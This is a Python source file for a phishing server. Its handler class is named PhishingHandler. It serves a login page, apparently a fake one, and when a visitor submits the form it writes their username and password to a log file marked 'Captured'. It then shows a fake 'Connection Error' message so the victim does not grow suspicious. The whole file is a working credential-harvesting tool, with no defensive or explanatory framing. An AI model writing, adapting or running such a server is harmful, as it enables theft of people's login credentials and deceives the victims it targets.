from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            with open('index.html', 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            fields = urllib.parse.parse_qs(post_data.decode())
            username = fields.get('username', [''])[0]
            password = fields.get('password', [''])[0]

            with open("log.txt", "a") as log:
                log.write(f"Captured -> USERNAME: {username}, PASSWORD: {password}\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<h1>Connection Error. Try again later.</h1>")

def run():
    print("Starting server at http://localhost:8000")
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, PhishingHandler)
    httpd.serve_forever()

if __name__ == "__main__":
    run()
